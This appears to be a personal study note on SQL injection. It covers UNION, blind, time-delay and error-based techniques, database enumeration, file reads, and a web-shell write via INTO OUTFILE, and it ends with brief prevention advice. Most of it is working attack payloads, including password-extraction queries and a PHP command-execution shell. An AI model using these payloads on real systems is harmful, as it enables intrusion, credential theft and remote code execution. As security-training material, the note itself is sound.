### General Notes

> Unauthorized user take control over SQL statements used by a web application.
> To explot SQL Injections, first find the injection point, and then craft a payload to take control over a query.
> Try TRUE and FALSE injections to check which one works.

> SQL queries inside web applications must connect to the database, submit the query, and then retrieve the results.

> Can use [[SQLMap]] to automate this test.
> [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

---

### Finding SQL Injections

>Can be used using [[Burp Suite]]'s web vulnerability scanner.
>The most common other locations where SQL injection arises are:
- In `UPDATE` statements, within the updated values or the `WHERE` clause.
- In `INSERT` statements, within the inserted values.
- In `SELECT` statements, within the table or column name.
- In `SELECT` statements, within the `ORDER BY` clause.

> Test all user inputs.
> Test these areas: 
* GET parameters.
* POST parameters.  //Use [[Burp Suite]] proxy
* [[HTTP]] headers.

Different injection characters to try and their [[Web Encoding#URL Encoding / Percent-Encoding]] as well:

|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|

> Detecting injection points:
* Enter the sinqle qoute character `'` and look for weird responses.
* Submit SQL syntax that evaluates that evaluates to true and false to see the difference, such as ` OR 1=1` and ` OR 1=2`.
* Payloads to trigger time delays.
* Submit payloads that trigger an out of band network interaction.

---

#### `UNION` Based Injections

The `UNION` keyword is used to retrieve data from other tables. It appends the results of the additional query to those of the original query. It combines the outputs of multiple `SELECT` statements that have the same number of columns.

> The queries must return the same amount of columns as the original one.
> The queries must return data of the same or allowed data type as the original one.
> Getting a 200 [[HTTP#HTTP Response]] code indicates the right number of columns.


##### Number of Columns using Added `NULL,`

* Keep adding `NULL` until there is an error. The number of `NULL`s right before the error is the number of columns.
```
' UNION SELECT NULL--
```
>  When the number of nulls matches the number of columns, an additional row of data will be returned in the result set, containing either the word `NULL` or an empty string.

* For oracle, need to add FROM for every SELECT. Use the built in DUAL table.
```
' UNION SELECT NULL FROM DUAL-- 
```

##### Number of Columns using `ORDER BY`
* Keep changing the `ORDER BY` index until an error is recieved. The number right before the one that produces an error is the number of columns.
```
' ORDER BY 1--
' ORDER BY 2--
...
```

##### Checking the Data Type of a column

Having known the number of columns, we can replace the `NULL` with a string/number/data-type and check the output.

> If it succeeds, then we know the data type of that column.
* We can then get exact data we want if we replace that data in the correct column field

##### Performing Injection

* To do an injection where the two `SELECT` queries output different columns, we simply add to the one with fewer columns more input data until it matches.

```SQL
SELECT * FROM table_1 UNION SELECT username, password, 1 FROM table_2;
```
> table_1 has 3 columns, but table_2 only has 2. So we add another fake column at the end to make it 3 and execute our `UNION` injection.

Sometimes, not all columns are produced as output visible by the user. Therefore, try different values at the different columns to see which ones are visible.

> The data we need is always produced at the end of the output in an extra row.

---

### Blind SQL Injections

> Application doesn't return the results of the query or details of errors in its response.

> To detect a blind vulnerability:
1. Change logic of query to trigger a detectable difference. Such as boolean logic or generate erros such as dividing by zero. Try true and false use cases. 
2. Trigger a time delay using boolean injection to detect when the delay occurs in which boolean value.
3. Trigger an out-of-band network interaction Out-of-band application security testing (OAST). For instance placing the data retrieved in a [[Domain Name System (DNS)]] lookup for a domain that you control.

##### Simple test using `AND`

> Try injecting a payload and use the `AND` operator with a false statement and a true statement and notice the difference in response.
> This can be used to enumerate data from tables.

```SQL
1) x" AND 1=1-- -
2) x" AND 1=2-- -
3) x" AND password LIKE 'a%'-- -
4) x" AND length(password)>5-- -
```
> Number 3 checks if the first letter of the password is `a`. If we get the same response we get for true statements, or statements that produce a favorable output, then we know that the first letter is `a` and can continue enumeration.

##### Tracking [[Cookies]]. 
> Some applications use tracking cookies to gather data about usage and users.
> They are processed by a SQL query such as: 
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
> The behaviour of the website can then be used to determine how the injection is vulnerable.
> Triggering different responses through false and true conditions.

> Use the value of the cookie along with true or false expressions using the `AND` operator to see how the website behaves differently.
> Use this information of true/false behaviours to exploit the website.

##### Conditional Errors (Check the portswigger [lab](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors))

> Sometimes boolean conditions do not affect the responses.
> So we can trigger SQL errors conditionally, causing database errors. This might affect the response.
> Trigger an error when the condition is true, otherwise, don't trigger an error. Check for [[HTTP]] response code 500.
```SQL
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)='' --
xyz' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END)||' --
```
> Use concatenation for easier expressions. Do not need to check equality in the end.
> Note the single qoute at the end.

> Knowing that the `FROM` part of a query is evaluated first then the `SELECT` part, lets use that to try and find the administrator user. `TO_CHAR` in oracle.
```SQL
xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator') || ' --
```
> If the administrator username exists, then the SELECT query will be evaluated as the FROM part succeeded. The CASE statement is always true, so it will trigger an error. This error can be used in blind injections to alter the response.
> If the FROM part fails, then the SELECT CASE part won't even run. The page will return normally.

>To add any more conditions, add `AND` in the FROM clause.
```SQL
xyz' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND length(password)>5) || ' --
```

##### Blind Enumeration 

* Check for the presence of a table:
```SQL
HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users LIMIT 1)='x' --'
HNgNNAq7tdrY9x17' AND (SELECT 'x' FROM users WHERE ROWNUM=1)='x' --'   //oracle
```
> This returns an 'x' for every row in the table. we limit to 1 to check for only 1 x returned. If there is no x returned, then there is no table, or there are no rows in that table.

* Check for the presence of an entry:
```SQL
HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator')='administrator' --'
```

* Check for the length of a row entry:
```SQL
HNgNNAq7tdrY9x17' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password) > 1 )='administrator' --'
```

* Check for the characters of a row entry: (`substr` for oracle)
```SQL
HNgNNAq7tdrY9x17' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator')='a' --'
```
> First 1 is the index, the second 1 is the length of the substring.

##### Verbose SQL Error Messages

> The error message shows the query we are injecting in, as well as the error message.
> We can make the error message include the sensitive data we need.

> Done using the `CAST()` function, which converts data into different data types.
```SQL
CAST((SELECT x FROM y) AS int)
```
> We usually want string type data. This will return an error message saying invalid data type with the requested data x from table y.

##### Time Delays

> Delaying the SQL queries causes a delay in the [[HTTP]] response.
> Use this delayed time to infer the truth of our query.

```SQL
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
> If the condition is true, that is the first letter of the admin password is larger than m, then the response will come after a given delay.

* Microsoft: `WAITFOR DELAY '0:0:<delay>'
* PostgreSQL: `SELECT pg_sleep(delay)`
* MySQL: `SELECT SLEEP(10)`
* Oracle: `dbms_pipe.receive_message('a',10)

##### Using OAST

> Out-of-bounds Application Security Testing.
> Trigger a network interaction to a system controlled by attacker.
> These interaction can be triggered conditionally.
> Using the [[Domain Name System (DNS)]] [[Protocol]].

> The payloads for OAST for the different databases are in the [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
> To add them, use this `' || <payload> -- ` or `' UNION <payload> --`.

---
### Reading From Files

To be able to read data in a database system, we need to first have the `FILE` privilege granted for the user we are currently logged in as.

* To determine the user:
```SQL
SELECT USER()
SELECT CURRENT_USER()
SELECT user FROM mysql.user
```

* To determine the privileges for the user:
```SQL
SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee='our-user';
```

* We can also check if we have super privileges:
```SQL
SELECT super_priv FROM mysql.user WHERE user='our-user';
```
> It will return `Y` indicating yes, meaning we have superuser privileges.

If our user has the `FILE` privilege, we can now load a file's contents and dump it into the database:
```SQL
SELECT LOAD_FILE('path/to/file');
```
> This can be one of the columns while injecting a query.

---
### Writing To Files

To be able to write to files is more difficult than reading from files, there needs to be 3 conditions met.
##### Conditions To Meet

1. We need the user to have the `FILE` privilege.
2. We also need the [[mysql]] global variable `secure_file_priv` to be disabled or be configured weakly.
3. We need write access to te location we want to write to, preferrably the root directory of the web server.

This is a global variable that determines where we can read/write to files.
* If it is empty, we have complete access to the entire file system.
* If it is set to `NULL`, we have no access to the entire file system.
* If it is set to a specific directory, then this is the only place we can access.

To see its value: 
```SQL
SHOW variables LIKE 'secure_file_priv';
```

Using `UNION` injection, we can see its value from the `information_schema` database.
```SQL
UNION SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv';
```

##### Writing Procedure

To write to files, we can use the `INTO OUTFILE` syntax:
```SQL
SELECT * FROM table_1 INTO OUTFILE 'path/to/file';
SELECT 'This is text' INTO OUTFILE 'path/to/file';
```

The location we want to write to is usually the root directory of the web server. This is to ensure it is executed, and can be reached easily from a browser.
> To find the root directory:
* Use the `LOAD_FILE` command to read the server configuration. Its location is dependant on the system.
* Use fuzzing attack to write files to different web roots, and see which one works:
	* `/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt`
	* `/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt`

The file we want to write is usually a [[File Upload#Web Shell]]. This is a famous one-liner:
```PHP
<?php echo system($_REQEUST["command"]); ?>
```

We can then write it using the above syntax:
```SQL
SELECT '<?php echo system($_GET["command"]); ?>' INTO OUTFILE '/root-directory/shell.php'
```

> Visiting the website with `/shell.php` at the end opens the reverse shell.
> Entering commands as a query parameter with name `command` exectues them.
 
```
/shell.php?command=<enter-here>
```

---
### Different Inputs and Obfuscating Attacks

> Obfuscating is using [[Web Encoding]] to perform attacks that could be blocked using web application [[Firewall]]s.
> Some websites take JSON or [[XML]] in their queries to ask the database.

> For XML use `hex-entities` encoding in [[Burp Suite]]'s hackvertor extension to bypass.

> Can encode some letters of the query to bypass these defense mechanisms.
```SQL
SELECT * FROM information_schema.tables
&#x53;ELECT * FROM information_schema.tables
```
> This is encoding using an HTML entity of a hex.
> This will be decoded first server side, and then passed to the SQL interpreter that communicates with the database.

---
### Enumerating Database

> Get the database information and version.
```SQL
SELECT BANNER FROM v$version;    //oracle
SELECT version FROM v$instance   //oracle
SELECT @@version  //microsoft and MySQL
SELECT version() // PostgreSQL
```

##### Using `INFORMATION_SCHEMA` Database

This database has metadata information about the tables and databases present on the system. Can be used to get information about the system before attacking. 

> This doesn't work on Oracle systems. There is an equivalent below.

* To list the databases on the system.
```SQL
SELECT * from information_schema.schemata;
```
> The elements in this table include:
* SCHEMA_NAME.

* To list all tables on the system.
```SQL
SELECT * FROM information_schema.tables ;
```
> The elements in this database are: (instead of * you can use any of these)
* TABLE_NAME
* TABLE_CATALOG
* TABLE_SCHEMA
* TABLE_TYPE

* list all tables in a database.
```SQL
UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev';
```

* To get the information of a table.
```SQL
SELECT * FROM information_schema.columns WHERE table_name= '';
```
> The elements in this database are same as above and: (instead of * you can use any of these)
* COLUMN_NAME
* DATA_TYPE

* To get the privilegs for users.
```SQL
SELECT grantee, privilege_type FROM information_schema.user_privileges;
```

* To get the global variables:
```SQL
SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name='what-we-want';
```

##### Using Information_schema Equivalent For Oracle

> List all tables using `all_tables`
```
SELECT * FROM all_tables
```
* TABLE_NAME

> List columns using `all_tab_columns`
```
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```
* COLUMN_NAME

---
### Payloads

> Try injecting: 
* String terminators: `'` and `"`.
* Other SQL commands: `SELECT`, `UNION`.
* SQL comments: `--` or `#`. For MySQL and Microsoft, add a space then `-` .

##### Example Payloads

```SQL
' OR 'a'='a
' OR 'a'='a'
' UNION SELECT Username, Password FROM Accounts/users WHERE 'a'='a
' UNION SELECT user(); -- -
2' AND 1=1; -- -
```
> Comments can either be `--` or `-- -`.
> Try the second one if the first doesn't work.

---
### Extra Info

> Commands to identify first character of username.
```
select user(); // returns the current user
select substring(string,position,length); //substring from the position and takes length many chrs.
example: select substring(user(),1,1)='r'; // checks if first letter from user is r.
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

> To concatenate results into one column
* Oracle and PostgreSQL
```
SELECT username || ':' || password FROM users
```
* Microsoft
```
SELECT username + password FROM users
```
* MySQL (space)
```
SELECT username password FROM users
```

> To make SQL case sensitive, use the `BINARY` keyword.

---

### Preventing SQL Injections

* Using parameterized queries instead of string concatention within the query.
	* The string used in the query must be a constant and not contain variables.
* Input sanitization.
* Input validation.
* Adding user privileges, so that users have access to certain functions in certain tables.
* Adding a WAF, Web Application [[Firewall]]. This will monitor and check for weird queries, such as access to special tables like `information_schema`.

---
